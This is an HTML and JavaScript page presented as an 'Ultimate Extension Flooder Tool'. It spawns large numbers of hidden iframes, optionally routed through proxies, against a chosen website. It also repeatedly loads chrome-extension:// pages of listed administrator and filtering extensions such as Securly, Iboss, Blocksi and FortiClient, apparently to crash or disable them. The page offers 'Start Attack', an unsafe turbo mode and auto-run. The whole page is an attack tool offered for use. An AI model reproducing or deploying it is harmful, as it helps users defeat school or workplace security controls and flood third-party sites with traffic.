<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ultimate Extension Flooder Tool</title>
  <style>
    body {
      background-color: #000;
      font-family: 'Arial', sans-serif;
      margin: 0;
      padding: 0;
      color: #0f0;
      overflow-x: hidden;
    }
    h1, h2, label, p {
      text-align: center;
      color: #0f0;
    }
    .container {
      width: 90%;
      max-width: 900px;
      margin: 20px auto;
      background: #111;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 20px #00ff00;
    }
    input, select, textarea, button {
      width: 100%;
      margin-top: 10px;
      padding: 12px;
      font-size: 16px;
      background: #111;
      color: #0f0;
      border: 1px solid #0f0;
      border-radius: 5px;
    }
    button:hover {
      background: #0f0;
      color: #000;
    }
    .stats, .status {
      text-align: center;
      margin-top: 15px;
    }
    iframe {
      display: none;
    }
    .flex {
      display: flex;
      justify-content: space-between;
      gap: 10px;
    }
    .flex button {
      flex: 1;
    }
  </style>
</head>
<body>

  <h1>ðŸ”¥ Ultimate Extension Flooder Tool ðŸ”¥</h1>

  <div class="container">
    <label for="targetUrl">Target URL:</label>
    <input type="text" id="targetUrl" value="https://www.wikipedia.org">

    <label for="iframeCount">Number of Iframes:</label>
    <input type="number" id="iframeCount" value="100" min="1">

    <label for="delay">Delay Between Iframes (ms):</label>
    <input type="number" id="delay" value="50" min="0">

    <label for="proxyList">Proxy List (comma-separated):</label>
    <input type="text" id="proxyList" placeholder="http://proxy1.com, http://proxy2.com">

    <label for="extensions">Select Extensions to Attack:</label>
    <select id="extensions" multiple size="8"></select>

    <div class="flex">
      <button onclick="selectAllExtensions()">Select All Extensions</button>
      <button onclick="deselectAllExtensions()">Deselect All</button>
    </div>

    <label><input type="checkbox" id="turboMode"> Enable Turbo++ Mode (Unsafe)</label>
    <label><input type="checkbox" id="autorun"> Auto-Run on Load</label>

    <div class="flex">
      <button onclick="startFlood()">Start Attack</button>
      <button onclick="stopFlood()" style="background:red;">Kill Switch</button>
    </div>

    <div class="status" id="status">Status: Ready</div>
    <div class="stats">
      <p>Frames Generated: <span id="frameCount">0</span></p>
      <p>Failures: <span id="failureCount">0</span></p>
      <p>Proxies Used: <span id="proxyUsed">None</span></p>
    </div>
  </div>

  <script>
    let flooding = false;
    let frameCount = 0;
    let failureCount = 0;
    let proxies = [];
    let proxyIndex = 0;
    let attackTargets = [];

    const protectedExtensions = [
      'hdokiejnpimakedhajhdlcegeplioahd', // LastPass (example)
      'kbfnbcaeplbcioakkpcpgfkobkghlhen', // Iboss
      'fjnbnpbmkenffdnngjfgmeleoegfcffe', // Securly
      'nkeimhogjdpnpccoofpliimaahmaaome', // FortiClient
      'lfboplenmmjhlhfaaialofmgcddjmpae', // Blocksi
      'aapocclcgogkmnckokdopfmhonfmgoek', // Google Docs Offline
      'pjkljhegncpnkpknbcohdijeoejaedia', // Chrome App Launcher
      // Add more admin extensions here...
    ];

    window.onload = function() {
      loadExtensions();
      if (document.getElementById('autorun').checked) {
        startFlood();
      }
    };

    function loadExtensions() {
      const dropdown = document.getElementById('extensions');
      protectedExtensions.forEach(ext => {
        const option = document.createElement('option');
        option.value = ext;
        option.textContent = `Extension ID: ${ext}`;
        dropdown.appendChild(option);
      });
    }

    function selectAllExtensions() {
      const dropdown = document.getElementById('extensions');
      for (let i = 0; i < dropdown.options.length; i++) {
        dropdown.options[i].selected = true;
      }
    }

    function deselectAllExtensions() {
      const dropdown = document.getElementById('extensions');
      for (let i = 0; i < dropdown.options.length; i++) {
        dropdown.options[i].selected = false;
      }
    }

    function startFlood() {
      if (flooding) return;
      flooding = true;
      frameCount = 0;
      failureCount = 0;
      proxies = document.getElementById('proxyList').value.split(',').map(p => p.trim()).filter(p => p);
      attackTargets = Array.from(document.getElementById('extensions').selectedOptions).map(opt => opt.value);
      document.getElementById('status').innerText = "Status: Flooding...";
      floodCycle();
    }

    function stopFlood() {
      flooding = false;
      document.getElementById('status').innerText = "Status: Stopped.";
    }

    function floodCycle() {
      const turbo = document.getElementById('turboMode').checked;
      const delay = parseInt(document.getElementById('delay').value) || 50;
      const count = parseInt(document.getElementById('iframeCount').value) || 100;
      const target = document.getElementById('targetUrl').value;

      for (let i = 0; i < count; i++) {
        setTimeout(() => {
          if (!flooding) return;
          attackFrame(target);
          attackExtensions();
          frameCount++;
          document.getElementById('frameCount').innerText = frameCount;
        }, turbo ? i * 1 : i * delay);
      }
    }

    function attackFrame(url) {
      const iframe = document.createElement('iframe');
      let proxy = proxies.length ? proxies[proxyIndex % proxies.length] : '';
      if (proxy) {
        iframe.src = proxy + '/' + url;
        proxyIndex++;
        document.getElementById('proxyUsed').innerText = proxy;
      } else {
        iframe.src = url;
      }
      iframe.onload = () => {
        setTimeout(() => iframe.remove(), 5000 + Math.random() * 5000);
      };
      iframe.onerror = () => {
        failureCount++;
        document.getElementById('failureCount').innerText = failureCount;
      };
      document.body.appendChild(iframe);
    }

    function attackExtensions() {
      attackTargets.forEach(extId => {
        const iframe = document.createElement('iframe');
        iframe.src = `chrome-extension://${extId}/`;
        iframe.onload = () => {
          setTimeout(() => iframe.remove(), 5000 + Math.random() * 5000);
        };
        iframe.onerror = () => {
          failureCount++;
          document.getElementById('failureCount').innerText = failureCount;
        };
        document.body.appendChild(iframe);
      });
    }
  </script>

</body>
</html>
